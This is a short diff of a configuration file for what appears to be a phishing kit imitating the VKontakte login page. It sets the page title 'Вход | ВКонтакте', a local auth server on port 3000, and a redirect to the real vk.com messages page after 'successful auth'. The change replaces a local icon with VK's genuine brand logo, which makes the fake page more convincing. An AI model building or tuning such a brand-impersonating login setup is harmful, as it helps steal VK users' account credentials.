@@ -5,7 +5,7 @@
 
 
 title: Вход | ВКонтакте # Title of page, that will be visible to user
-image: /icon.png # Same as title
+image: https://vk.com/images/brand/vk-logo.png # Same as title
 exit: https://vk.com/im # User will go to this page after successful auth
 port: 3000 # Port to server listen on
 authUrl: /auth # Authorization server url, used by ajax requests on client
